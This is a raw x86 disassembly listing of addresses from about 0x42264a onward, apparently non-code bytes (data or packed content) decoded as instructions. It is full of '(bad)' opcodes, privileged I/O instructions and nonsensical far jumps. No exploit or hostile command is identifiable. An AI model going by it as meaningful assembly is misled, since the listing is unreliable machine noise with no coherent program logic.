  42264a:	and    al,0x8
  42264c:	hlt    
  42264d:	sub    esi,DWORD PTR [ebx-0x7f3b8273]
  422653:	iret   
  422654:	push   edi
  422655:	out    0x39,eax
  422657:	aaa    
  422658:	inc    esi
  422659:	push   ebx
  42265a:	jecxz  0x42265e
  42265c:	xor    eax,0xe4cf29ae
  422661:	mov    ds:0x205b8971,al
  422666:	mov    dl,bl
  422668:	cmp    DWORD PTR [edx],edi
  42266a:	int    0x31
  42266c:	iret   
  42266d:	mov    esp,0xb3332315
  422672:	popf   
  422673:	not    DWORD PTR [eax+0x12a09e94]
  422679:	clc    
  42267a:	add    cl,dh
  42267c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42267d:	push   edi
  42267e:	call   0x63ed:0x8e00065a
  422685:	pop    ds
  422686:	xor    ah,BYTE PTR [ebx]
  422688:	xor    ecx,DWORD PTR [ebx-0x16c67e1c]
  42268e:	jle    0x422697
  422690:	out    0x44,al
  422692:	rol    DWORD PTR [ebx-0x15e2852c],0xac
  422699:	and    eax,0xe1990fa
  42269e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42269f:	sub    eax,0x3a106b45
  4226a4:	retf   0x251d
  4226a7:	add    esp,ebp
  4226a9:	push   ds
  4226aa:	ins    BYTE PTR es:[edi],dx
  4226ab:	outs   dx,DWORD PTR ds:[esi]
  4226ac:	adc    ecx,DWORD PTR [esp+edi*2+0x2e]
  4226b0:	xor    eax,esp
  4226b2:	mov    es,WORD PTR [edi-0x15d16c37]
  4226b8:	std    
  4226b9:	cld    
  4226ba:	mov    dl,0x56
  4226bc:	stc    
  4226bd:	stc    
  4226be:	sub    eax,0x362f0c5b
  4226c3:	(bad)  
  4226c4:	retf   
  4226c5:	sbb    eax,0xd95d1eb4
  4226ca:	ins    DWORD PTR es:[edi],dx
  4226cb:	xlat   BYTE PTR ds:[ebx]
  4226cc:	inc    ebp
  4226cd:	fdiv   QWORD PTR [esi-0x2a]
  4226d0:	repnz call 0xe905:0xb7720ab1
  4226d8:	mov    cl,0xa8
  4226da:	pcmpgtw mm7,QWORD PTR [ebp-0x2f]
  4226de:	pushf  
  4226df:	inc    esp
  4226e0:	add    edx,DWORD PTR [edx-0x28]
  4226e3:	adc    BYTE PTR [edi],bl
  4226e5:	jne    0x422745
  4226e7:	jns    0x4226a6
  4226e9:	rol    esi,0xf9
  4226ec:	hlt    
  4226ed:	dec    BYTE PTR [ebx]
  4226ef:	mov    ch,BYTE PTR [edi]
  4226f1:	inc    esi
  4226f2:	sahf   
  4226f3:	pop    ebp
  4226f4:	jecxz  0x42276e
  4226f6:	pusha  
  4226f7:	add    al,0x18
  4226fa:	sbb    eax,0x238ed014
  4226ff:	push   edx
  422700:	inc    edx
  422701:	loopne 0x422775
  422703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422704:	(bad)  
  422706:	out    dx,eax
  422707:	sbb    ecx,DWORD PTR [edx-0x6a]
  42270a:	stc    
  42270b:	mov    DWORD PTR [ecx+0x493d71ce],eax
	...
  422771:	add    BYTE PTR [eax],al
  422773:	add    BYTE PTR [edi],ah
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x8c7f01c8
  422781:	mov    al,ds:0x6fe3f8d1
  422786:	add    DWORD PTR [eax],eax
  422788:	add    eax,0xb7000001
  42278d:	jbe    0x4227cd
  42278f:	mov    cl,0x1a
  422791:	mov    ah,BYTE PTR [edx]
  422793:	popa   
  422794:	nop
  422795:	shl    DWORD PTR [edx-0x572cda58],cl
  42279b:	sub    ebp,ecx
  42279d:	es jmp 0x4761875a
  4227a3:	daa    
  4227a4:	(bad)  
  4227a5:	xor    dl,BYTE PTR [ebx-0x19]
  4227a8:	jbe    0x422739
  4227aa:	mov    fs,WORD PTR [edx+ebp*4-0x72f147b0]
  4227b1:	cld    
  4227b2:	mov    esi,0x50aa5bd7
  4227b7:	popf   
  4227b8:	inc    ecx
  4227b9:	enter  0xb0d7,0xf5
  4227bd:	scas   eax,DWORD PTR es:[edi]
  4227be:	fscale 
  4227c0:	pusha  
  4227c1:	sbb    edx,DWORD PTR [edx-0x7a67c96f]
  4227c7:	pushf  
  4227c8:	clc    
  4227c9:	shl    ch,0xae
  4227cc:	rcr    DWORD PTR [edx-0x33],1
  4227cf:	adc    ch,ah
  4227d1:	mov    edi,0x6d19884e
  4227d6:	add    al,0x97
  4227d8:	jae    0x4227ed
  4227da:	push   0xffffff85
  4227dc:	or     BYTE PTR [eax+0x11],bh
  4227df:	and    dl,dh
  4227e1:	pop    edx
  4227e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227e3:	cmp    eax,edx
  4227e5:	pusha  
  4227e6:	push   ebp
  4227e7:	push   eax
  4227e8:	dec    ebp
  4227e9:	and    bh,BYTE PTR [ecx]
  4227eb:	imul   esp,DWORD PTR [ecx],0xffffffe1
  4227ee:	data16 mov BYTE PTR [ebx],bh
  4227f1:	es scas al,BYTE PTR es:[edi]
  4227f3:	jmp    0x37f1a10c
  4227f8:	fsub   st(5),st
  4227fa:	out    dx,al
  4227fb:	test   DWORD PTR [edi],eax
  4227fd:	jp     0x42284f
  4227ff:	gs es pop edi
  422802:	mov    ch,0xe3
  422804:	push   edx
  422805:	mov    eax,ds:0xebed592
  42280a:	mov    al,ds:0xfa47cd5a
  42280f:	fstp   QWORD PTR [esi-0x21134c82]
  422815:	and    DWORD PTR [ebx+edi*8-0x75],esi
  422819:	test   BYTE PTR [ecx-0x62],0x4f
  42281d:	push   ss
  42281e:	jb     0x422871
  422820:	in     al,0xa8
  422822:	ret    0xc2a8
  422825:	fld    DWORD PTR ds:0xb907a013
  42282b:	xor    DWORD PTR [ebp+0xb91494a],0x2a
  422832:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422833:	in     eax,0x28
  422835:	pop    esi
  422836:	addr16 xchg esi,eax
  422838:	jle    0x4227fb
  42283a:	mov    ecx,0x7c11d803
  42283f:	or     cl,BYTE PTR [ebx-0x6f]
  422842:	stos   DWORD PTR es:[edi],eax
  422843:	les    eax,FWORD PTR [esi+0x68]
  422846:	lahf   
  422847:	pop    ebp
  422848:	cdq    
  422849:	add    al,0x42
  42284b:	fistp  DWORD PTR [eax-0x34ff9ff1]
  422851:	cmp    al,0x3e
  422853:	xor    DWORD PTR [edx+0x7b],0xb2fa0851
  42285a:	xchg   edx,eax
  42285b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285c:	mov    bl,0x5c
  42285e:	cmc    
  42285f:	xor    eax,0xc7a8a805
  422864:	mov    ds:0x9d22b68a,eax
  422869:	mov    bh,BYTE PTR [eax]
  42286b:	sub    BYTE PTR [eax+0x7],0x5
  42286f:	repz jecxz 0x4228a4
  422872:	inc    eax
  422873:	adc    al,0xa0
  422875:	pop    edi
  422876:	xor    al,0x21
  422878:	xor    eax,0x175c53b6
  42287d:	(bad)  
  42287e:	gs sahf 
  422880:	mov    ecx,0xb17ec519
  422885:	lods   al,BYTE PTR ds:[esi]
  422886:	idiv   BYTE PTR [ecx]
  422888:	and    DWORD PTR [eax-0x505e2f3a],eax
  42288e:	jmp    0x42282b
  422890:	test   al,0x0
	...
  4228f2:	add    BYTE PTR [eax],al
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422894
  422901:	dec    esp
  422902:	xchg   ebx,eax
  422903:	xlat   BYTE PTR ds:[ebx]
  422904:	call   0x5422a79
  422909:	add    DWORD PTR [eax],eax
  42290b:	add    bl,dh
  42290d:	mov    esi,0xc67dedf9
  422912:	pop    ss
  422913:	xchg   esi,eax
  422914:	div    DWORD PTR [eax+0x5a219787]
  42291a:	and    eax,0x11f64836
  42291f:	mov    DWORD PTR [esp+edi*1],esi
  422922:	and    DWORD PTR [ebp+0x3],esi
  422925:	mov    bl,0x0
  422927:	(bad)  
  422928:	dec    esp
  422929:	jge    0x422980
  42292b:	mov    DWORD PTR [edi+esi*1-0x58],eax
  42292f:	xchg   DWORD PTR [ecx+0x734e5dd1],ecx
  422935:	add    si,WORD PTR [eax+0x2369243e]
  42293c:	add    ebx,DWORD PTR [esi+0x1b]
  42293f:	mov    ebp,0xe745f84
  422944:	xor    ebx,DWORD PTR [ecx-0x77bb59e6]
  42294a:	loop   0x42298e
  42294c:	jno    0x4228d7
  42294e:	rcl    al,0x3b
  422951:	leave  
  422952:	mov    ds:0x75a19c4f,al
  422957:	cld    
  422958:	cmpxchg BYTE PTR [eax],ah
  42295b:	rcl    dl,0x7
  42295e:	pop    esi
  42295f:	mov    edx,0xb45eda7f
  422964:	pushf  
  422965:	mov    esp,DWORD PTR ds:[eax+0xbd38444]
  42296c:	dec    edx
  42296d:	dec    edx
  42296e:	fistp  WORD PTR [ebx+0x5c]
  422971:	pop    esp
  422972:	mov    BYTE PTR ds:0x56cb9d72,dh
  422978:	mov    esp,0x9cf9f5fb
  42297d:	or     edi,DWORD PTR [ebx]
  42297f:	fwait
  422980:	scas   eax,DWORD PTR es:[edi]
  422981:	(bad)
  422984:	lahf   
  422985:	sub    al,0x4e
  422987:	imul   ecx,DWORD PTR [esi-0x5033f0b3],0x74
  42298e:	arpl   WORD PTR [ebx-0x4d],bp
  422991:	ja     0x422972
  422993:	push   0x3ac80152
  422998:	add    ch,BYTE PTR [eax-0x4d54c0a0]
  42299e:	nop
  42299f:	or     BYTE PTR [ecx+0x58562289],bl
  4229a5:	lea    ecx,[ecx-0x4b]
  4229a8:	and    eax,DWORD PTR [ebx]
  4229aa:	imul   eax,DWORD PTR [ebx+ebp*2-0x45a4cb3a],0xffffffea
  4229b2:	(bad)  
  4229b3:	es xchg esi,eax
  4229b5:	das    
  4229b6:	enter  0xca66,0xd4
  4229ba:	rcr    BYTE PTR [eax],1
  4229bc:	fcmovb st,st(3)
  4229be:	push   edi
  4229bf:	add    eax,0x8fc9b24b
  4229c4:	pop    fs
  4229c6:	jl     0x422a2b
  4229c8:	popf   
  4229c9:	cld    
  4229ca:	cmp    ah,0x81
  4229cd:	jmp    DWORD PTR ds:0xea0ad6d3
  4229d3:	jge    0x4229e0
  4229d5:	sbb    ebx,DWORD PTR [ecx+0x47c99763]
  4229db:	mov    al,0x6d
  4229dd:	enter  0x1d5,0x51
  4229e1:	jp     0x422a5f
  4229e3:	sbb    ebx,DWORD PTR [eax]
  4229e5:	cdq    
  4229e6:	sub    BYTE PTR [di],bh
  4229e9:	jae    0x4229af
  4229eb:	pop    esp
  4229ec:	ins    BYTE PTR es:[edi],dx
  4229ed:	cwde   
  4229ee:	or     BYTE PTR [ebx],al
  4229f0:	mov    BYTE PTR [esi+0x7f5f664f],ch
  4229f6:	mov    ebx,0x48ef4ce
  4229fb:	mov    eax,0xe72c3e7
  422a00:	jmp    eax
  422a02:	mov    al,0xc1
  422a04:	shl    DWORD PTR [edx+0xe],cl
  422a07:	cwde   
  422a08:	sub    DWORD PTR [edx+0x30],edx
  422a0b:	lods   al,BYTE PTR ds:[esi]
  422a0c:	pushf  
  422a0d:	shr    BYTE PTR [ecx-0x3b],1
  422a10:	dec    eax
	...
  422a71:	add    BYTE PTR [eax],al
  422a73:	add    BYTE PTR [esi-0x377e796],dl
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	test   bh,cl
  422a82:	shl    BYTE PTR [edi],cl
  422a84:	in     eax,dx
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR ds:0x45000001,al
  422a8d:	push   ebx
  422a8e:	add    al,0x5f
  422a90:	pop    es
  422a91:	dec    ebx
  422a92:	jno    0x422a6a
  422a94:	mov    bh,0x53
  422a96:	out    0xd8,eax
  422a98:	inc    ebx
  422a99:	int    0xd6
  422a9b:	daa    
  422a9c:	inc    ebx
  422a9d:	pop    ecx
  422a9e:	js     0x422afa
  422aa0:	(bad)  
  422aa3:	hlt    
  422aa4:	test   dh,0xc7
  422aa7:	inc    edi
  422aa8:	jp     0x422aef
  422aaa:	test   al,0xe9
  422aac:	arpl   WORD PTR [edi],si
  422aae:	div    BYTE PTR ds:[ecx-0x32]
  422ab2:	retf   
  422ab3:	fcomp  QWORD PTR [ebx]
  422ab5:	push   ebp
  422ab6:	es repnz dec eax
  422ab9:	xlat   BYTE PTR ds:[ebx]
  422aba:	add    BYTE PTR [edi-0x1c3db9e2],dl
  422ac0:	mov    edx,0x2f749c16
  422ac5:	push   es
  422ac6:	jp     0x422acb
  422ac8:	je     0x422a8a
  422aca:	dec    eax
  422acb:	loopne 0x422af1
  422acd:	or     BYTE PTR [edx],0xed
  422ad0:	xchg   ebx,eax
  422ad1:	fwait
  422ad2:	sbb    eax,0x21970aae
  422ad7:	das    
  422ad8:	lods   eax,DWORD PTR ds:[esi]
  422ad9:	ins    BYTE PTR es:[edi],dx
  422ada:	popf   
  422adb:	rcl    DWORD PTR [ebx],cl
  422add:	loope  0x422a98
  422adf:	test   DWORD PTR [edi+ebp*2-0x3b],ecx
  422ae3:	popf   
  422ae4:	pop    eax
  422ae5:	jmp    0xdbc5:0x9262e14a
  422aec:	ds pop esi
  422aee:	(bad)  
  422aef:	sub    bh,BYTE PTR [esi+0xc]
  422af2:	lock repnz rcr DWORD PTR [edx+0x5d],1
  422af7:	js     0x422b56
  422af9:	aam    0x7e
  422afb:	dec    ebx
  422afc:	js     0x422b3e
  422afe:	stc    
  422aff:	in     eax,0x3d
  422b01:	fstp   DWORD PTR [ebp-0x3a34f65e]
  422b07:	pop    eax
  422b08:	scas   eax,DWORD PTR es:[edi]
  422b09:	cmp    eax,0x99086bf8
  422b0e:	mov    cl,BYTE PTR [ebp+0x2a]
  422b11:	call   0x62a1:0x532e109f
  422b18:	fbld   TBYTE PTR [edx-0x22]
  422b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b1c:	adc    al,BYTE PTR [esi]
  422b1e:	das    
  422b1f:	bound  esi,QWORD PTR [ebp+0x65]
  422b22:	add    eax,0x1436b404
  422b27:	shr    BYTE PTR [ecx+0x4da70630],1
  422b2d:	mov    BYTE PTR [edx-0x2a7b7f9f],dh
  422b33:	idiv   DWORD PTR [ebp+eax*1+0x50771f25]
  422b3a:	scas   eax,DWORD PTR es:[edi]
  422b3b:	cwde   
  422b3c:	iret   
  422b3d:	inc    edx
  422b3e:	repz scas al,BYTE PTR es:[edi]
  422b40:	loop   0x422ae5
  422b42:	mov    WORD PTR [ecx],gs
  422b44:	push   esp
  422b45:	fidiv  DWORD PTR ds:0xb791b7e8
  422b4b:	dec    ecx
  422b4c:	out    dx,al
  422b4d:	push   eax
  422b4e:	loopne 0x422af4
  422b50:	test   al,0xc4
  422b52:	mov    al,ds:0x59d16c9b
  422b57:	mov    bl,0x58
  422b59:	scas   al,BYTE PTR es:[edi]
  422b5a:	xor    DWORD PTR [ebx+0x14],esp
  422b5d:	outs   dx,DWORD PTR ds:[esi]
  422b5e:	icebp  
  422b5f:	cmp    eax,0x8ab496ff
  422b64:	add    BYTE PTR [esi-0x39],cl
  422b67:	lds    ebx,FWORD PTR [ecx+0x5]
  422b6a:	repnz dec ebx
  422b6c:	lds    eax,FWORD PTR [ebx-0x70]
  422b6f:	arpl   WORD PTR [esi+edi*8+0x1e],bp
  422b73:	sahf   
  422b74:	and    edx,eax
  422b76:	dec    eax
  422b77:	jns    0x422b4e
  422b79:	mov    ah,0x68
  422b7b:	jg     0x422b43
  422b7d:	int3   
  422b7e:	push   ss
  422b7f:	mov    edi,DWORD PTR [esi+0x130f4673]
  422b85:	dec    esi
  422b86:	clc    
  422b87:	arpl   WORD PTR [ebx+0x22e295da],cx
  422b8d:	scas   al,BYTE PTR es:[edi]
  422b8e:	or     DWORD PTR [esi+0xb1],0x0
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x5d8cb264]
  422c02:	xor    eax,0x172f272
  422c07:	add    BYTE PTR ds:0xa4000001,al
  422c0d:	pop    ecx
  422c0e:	int3   
  422c0f:	push   esi
  422c10:	scas   al,BYTE PTR es:[edi]
  422c11:	pop    esp
  422c12:	xchg   bh,al
  422c14:	sbb    edx,esp
  422c16:	in     eax,dx
  422c17:	inc    esp
  422c18:	mov    al,0x9a
  422c1a:	mov    ah,BYTE PTR [ecx+edi*8+0x7d]
  422c1e:	loope  0x422c12
  422c20:	scas   eax,DWORD PTR es:[edi]
  422c21:	mov    WORD PTR [eax+eiz*2],?
  422c24:	(bad)  
  422c26:	pop    edi
  422c27:	jmp    0x3649:0x5d04324d
  422c2e:	jo     0x422bd5
  422c30:	push   eax
  422c31:	push   eax
  422c32:	xchg   ecx,eax
  422c33:	div    BYTE PTR fs:[edi-0x78fb3278]
  422c3a:	add    bh,ah
  422c3c:	jno    0x422ca8
  422c3e:	std    
  422c3f:	call   0x89377386
  422c44:	and    ebx,ebp
  422c46:	xchg   esp,eax
  422c47:	pop    esi
  422c48:	mov    edx,0xea3cf636
  422c4d:	and    BYTE PTR ds:[ecx*8-0x102965d9],dl
  422c55:	inc    ecx
  422c56:	rol    dx,1
  422c59:	jnp    0x422c84
  422c5b:	cld    
  422c5c:	push   es
  422c5d:	mov    bh,0x58
  422c5f:	pop    eax
  422c60:	cmp    DWORD PTR [edi-0x40],eax
  422c63:	js     0x422c50
  422c65:	ds push cs
  422c67:	adc    eax,DWORD PTR [esi+0x2c056697]
  422c6d:	sub    DWORD PTR [esi+0x30],edi
  422c70:	sub    dl,BYTE PTR [ebp-0x72a659b6]
  422c76:	push   edi
  422c77:	sub    dh,bl
  422c79:	xlat   BYTE PTR ds:[ebx]
  422c7a:	adc    bh,ch
  422c7c:	mov    edi,0x3bd44d6d
  422c81:	frstor [edx+ebp*1]
  422c84:	pusha  
  422c85:	jmp    0x5856:0x5f8d1bf9
  422c8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c8d:	adc    ecx,edx
  422c8f:	nop
  422c90:	lock xor DWORD PTR [ebx],edi
  422c93:	out    dx,eax
  422c94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c95:	xor    BYTE PTR [ecx-0x1a71e744],0x63
  422c9c:	les    ebx,FWORD PTR [si-0xdc5]
  422ca1:	and    BYTE PTR [ebp+esi*8+0x7a2ba3d9],0x6
  422ca9:	mov    al,0x76
  422cab:	pop    eax
  422cac:	push   esp
  422cad:	inc    ecx
  422cae:	aas    
  422caf:	or     eax,0xd20afb9a
  422cb4:	xlat   BYTE PTR ds:[ebx]
  422cb5:	xor    BYTE PTR [eax-0x1e6c3b8a],dl
  422cbb:	out    dx,al
  422cbc:	frstor [ebx-0x3ffab43b]
  422cc2:	int3   
  422cc3:	fadd   st(0),st
  422cc5:	mov    dl,0xee
  422cc7:	arpl   bx,sp
  422cc9:	stos   DWORD PTR es:[edi],eax
  422cca:	int3   
  422ccb:	sub    eax,DWORD PTR [esp+ecx*1-0x6c1cb018]
  422cd2:	(bad)  
  422cd3:	hlt    
  422cd4:	dec    ebp
  422cd5:	lods   al,BYTE PTR ds:[esi]
  422cd6:	lods   al,BYTE PTR ds:[esi]
  422cd7:	mov    ah,0x73
  422cd9:	cmp    al,0xdf
  422cdb:	in     al,0xfb
  422cdd:	mov    dh,0xd9
  422cdf:	cmp    DWORD PTR [ebx+0xc],edx
  422ce2:	aam    0x1e
  422ce4:	fst    st(7)
  422ce6:	xor    al,0xed
  422ce8:	std    
  422ce9:	jbe    0x422c96
  422ceb:	mov    ds:0x87331ec1,al
  422cf0:	sbb    bl,BYTE PTR [edi+0x220242a7]
  422cf6:	sub    BYTE PTR [esi+0x64],al
  422cf9:	stc    
  422cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cfb:	pop    ebp
  422cfc:	test   al,0x43
  422cfe:	aaa    
  422cff:	add    al,0xf9
  422d01:	cmp    al,0x58
  422d03:	dec    esi
  422d04:	jno    0x422ca4
  422d06:	stc    
  422d07:	int    0x35
  422d09:	lahf   
  422d0a:	sbb    BYTE PTR [ecx+ebx*4-0x1bed10e7],dh
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    esi,DWORD PTR [ebx]
  422d81:	or     dh,BYTE PTR [eax+eiz*4-0x9]
  422d85:	jae    0x422d88
  422d87:	add    BYTE PTR ds:0x8e000001,al
  422d8d:	stos   DWORD PTR es:[edi],eax
  422d8e:	repz pop ecx
  422d90:	sar    BYTE PTR [ebx-0x76],0x13
  422d94:	xor    eax,0x4b157e7e
  422d99:	xchg   edx,eax
  422d9a:	ret    
  422d9b:	inc    edx
  422d9c:	mov    ebx,0x4e9480
  422da1:	scas   al,BYTE PTR es:[edi]
  422da2:	in     eax,0xac
  422da4:	mov    ebx,0xf2f42a77
  422da9:	mov    al,ds:0x7a289cba
  422dae:	push   edx
  422daf:	out    0xf0,al
  422db1:	and    BYTE PTR [edi-0x2d],dh
  422db4:	pop    ebp
  422db5:	into   
  422db6:	pop    ds
  422db7:	arpl   di,bp
  422db9:	icebp  
  422dba:	xor    eax,0x820e53c
  422dbf:	and    DWORD PTR [eax-0x1],ebp
  422dc2:	cmp    bh,BYTE PTR [ebp+0x3a]
  422dc5:	ror    DWORD PTR [esp+ebx*8+0x67],1
  422dc9:	lea    edx,[ebx-0x1a7eeda4]
  422dcf:	inc    ebp
  422dd0:	jle    0x422db9
  422dd2:	enter  0x3706,0x8f
  422dd6:	stos   DWORD PTR es:[edi],eax
  422dd7:	ret    
  422dd8:	push   eax
  422dd9:	dec    edi
  422dda:	inc    edx
  422ddb:	stos   BYTE PTR es:[edi],al
  422ddc:	sbb    ebx,DWORD PTR [bx+0x72]
  422de0:	and    edi,DWORD PTR [esi]
  422de2:	jo     0x422e60
  422de4:	cdq    
  422de5:	fnsave [edx]
  422de7:	mov    bh,BYTE PTR [eax+edx*1-0x29]
  422deb:	dec    ecx
  422dec:	mov    ch,0xeb
  422dee:	fisub  WORD PTR [edx+esi*8+0x5a]
  422df2:	mov    ah,0x73
  422df4:	addr16 test al,0x57
  422df7:	sbb    bh,al
  422df9:	xchg   ecx,eax
  422dfa:	sub    BYTE PTR [ecx],0x36
  422dfd:	push   0x4b
  422dff:	jae    0x422e4b
  422e01:	sahf   
  422e02:	test   BYTE PTR ds:0x4e6f6c81,dh
  422e08:	cli    
  422e09:	mov    dl,0xdd
  422e0b:	dec    edx
  422e0c:	or     dh,al
  422e0e:	iret   
  422e0f:	cmp    BYTE PTR [esp+eax*8-0x7f],bh
  422e13:	mov    dh,0x49
  422e15:	adc    BYTE PTR [edi+0x14558ed2],cl
  422e1b:	pop    ss
  422e1c:	add    al,cl
  422e1e:	jb     0x422e0c
  422e20:	dec    BYTE PTR [ebp-0x15]
  422e23:	cmp    eax,0x3285f53b
  422e28:	out    0x56,eax
  422e2a:	xor    BYTE PTR [ebx+0x4a0d05df],bl
  422e30:	push   ecx
  422e31:	cmp    dl,bh
  422e33:	mov    ds:0xe67c8ded,eax
  422e38:	mov    esp,cs
  422e3a:	inc    edi
  422e3b:	sub    BYTE PTR [eax-0x4d],al
  422e3e:	xor    eax,0x39f40c1d
  422e43:	push   ecx
  422e44:	out    0x27,al
  422e46:	pop    eax
  422e47:	ror    DWORD PTR [ebx+0x7f],cl
  422e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e4b:	pop    ds
  422e4c:	mov    bl,BYTE PTR [eax-0x5d8a01cc]
  422e52:	cmp    edx,0x69ba2b04
  422e58:	pop    ecx
  422e59:	stos   DWORD PTR es:[edi],eax
  422e5a:	cmp    al,0x30
  422e5c:	push   edi
  422e5d:	mov    eax,0xffd31860
  422e62:	jg     0x422ec2
  422e64:	dec    edx
  422e65:	push   ebx
  422e66:	mov    WORD PTR [ecx+0x6076eaea],es
  422e6c:	pop    ebp
  422e6d:	jp     0x422eda
  422e6f:	mov    esp,DWORD PTR cs:[edx]
  422e72:	lahf   
  422e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e74:	mov    esp,esi
  422e76:	loopne 0x422e4f
  422e78:	and    eax,0x4e7b2cfa
  422e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e7e:	je     0x422e66
  422e80:	jl     0x422e57
  422e82:	push   ds
  422e83:	xor    BYTE PTR [eax],bh
  422e85:	into   
  422e86:	pop    ds
  422e87:	fsubr  QWORD PTR [eax]
  422e89:	ret    0x5bea
  422e8c:	adc    dh,BYTE PTR [ebp+0x436ff9]
	...
  422ef2:	add    BYTE PTR [eax],al
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0x5c2aca33
  422f02:	addr16 cmp bh,ah
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0x51000001,al
  422f0d:	add    DWORD PTR ds:0x18572e17,esi
  422f13:	xchg   esp,eax
  422f14:	mov    eax,ds:0xf71c6e09
  422f19:	and    BYTE PTR [eax],cl
  422f1b:	adc    al,0x9
  422f1d:	adc    BYTE PTR [ebx+0x61],dl
  422f20:	lods   al,BYTE PTR ds:[esi]
  422f21:	pop    ecx
  422f22:	mov    ecx,fs
  422f24:	mov    ds:0xb0049423,eax
  422f29:	push   0xc045b88c
  422f2e:	addr16 jg 0x422ec4
  422f31:	aas    
  422f32:	jmp    0xcb9d9932
  422f37:	xlat   BYTE PTR ds:[ebx]
  422f38:	cmp    BYTE PTR [ecx],dl
  422f3a:	stc    
  422f3b:	daa    
  422f3c:	aas    
  422f3d:	xchg   edi,eax
  422f3e:	adc    dh,BYTE PTR [eax]
  422f40:	sbb    dh,bh
  422f42:	xlat   BYTE PTR ds:[ebx]
  422f43:	jmp    0x4c87985
  422f48:	jge    0x422f18
  422f4a:	loope  0x422f1f
  422f4c:	stos   BYTE PTR es:[edi],al
  422f4d:	popa   
  422f4e:	inc    esp
  422f4f:	xchg   DWORD PTR [esi+0x68d9d0d4],eax
  422f55:	mov    esi,gs
  422f57:	les    esp,FWORD PTR [eax]
  422f59:	ret    
  422f5a:	mov    ch,0x7c
  422f5c:	cdq    
  422f5d:	test   BYTE PTR [eax+0x67f6c912],bh
  422f63:	mov    eax,ds:0xe749caba
  422f68:	(bad)  
  422f69:	int    0x49
  422f6b:	and    DWORD PTR [edi-0x6662931c],esi
  422f71:	ins    BYTE PTR es:[edi],dx
  422f72:	lea    esp,[ecx+ebx*1-0xcc5a8a3]
  422f79:	test   DWORD PTR [esi-0x6b],0x5d493618
  422f80:	lock and DWORD PTR ss:[esi+ecx*1+0x16],edx
  422f86:	jbe    0x422f3b
  422f88:	xchg   ebp,eax
  422f89:	and    BYTE PTR [ecx-0x3a121f8f],al
  422f8f:	mov    bh,0xf6
  422f91:	inc    ecx
  422f92:	jl     0x422fdc
  422f94:	mov    DWORD PTR [edi],edi
  422f96:	in     eax,dx
  422f97:	cdq    
  422f98:	adc    dh,BYTE PTR [eax+edi*8+0x1d8a76dd]
  422f9f:	in     al,dx
  422fa0:	mov    bh,0xde
  422fa2:	je     0x422fc5
  422fa4:	sbb    al,0xec
  422fa6:	daa    
  422fa7:	push   ds
  422fa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fa9:	inc    eax
  422faa:	mov    ebp,DWORD PTR [ecx+eiz*4]
  422fad:	pop    ds
  422fae:	and    DWORD PTR [eax+0x1d],ebx
  422fb1:	jle    0x422f68
  422fb3:	jmp    0xd06b2016
  422fb8:	mov    BYTE PTR [edi+0x17bbb27c],bh
  422fbe:	mov    ds:0x2b671c34,al
  422fc3:	add    esp,edi
  422fc5:	add    eax,0xcdc57a5b
  422fca:	icebp  
  422fcb:	and    ecx,DWORD PTR [ebx]
  422fcd:	call   0x1aba5147
  422fd2:	xor    BYTE PTR [esp+ebp*1-0xe],al
  422fd6:	inc    eax
  422fd7:	mov    cs,eax
  422fd9:	rcr    ah,1
  422fdb:	repz call 0xd24a:0x758a2b4d
  422fe3:	(bad)  
  422fe4:	retf   
  422fe5:	pop    ecx
  422fe6:	sti    
  422fe7:	mov    ecx,0xf16f5fd4
  422fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fed:	and    ebp,DWORD PTR [esi+0x27]
  422ff0:	xchg   edi,eax
  422ff1:	dec    ebx
  422ff2:	sub    eax,0x472628b4
  422ff7:	mov    ch,0x24
  422ff9:	mov    al,ds:0x948fd135
  422ffe:	mov    al,ds:0x3885f6cc
  423003:	(bad)  
  423004:	(bad)
  423007:	xchg   esi,eax
  423008:	jae    0x423053
  42300a:	mov    eax,0x6fb8f228
  42300f:	dec    edi
  423010:	xor    eax,0x0
	...
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ebx+ebp*1+0x1f9ce0a],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0xaf000001,al
  42308d:	or     bh,cl
  42308f:	cmp    BYTE PTR [ebx],al
  423091:	scas   eax,DWORD PTR es:[edi]
  423092:	call   0x26103a24
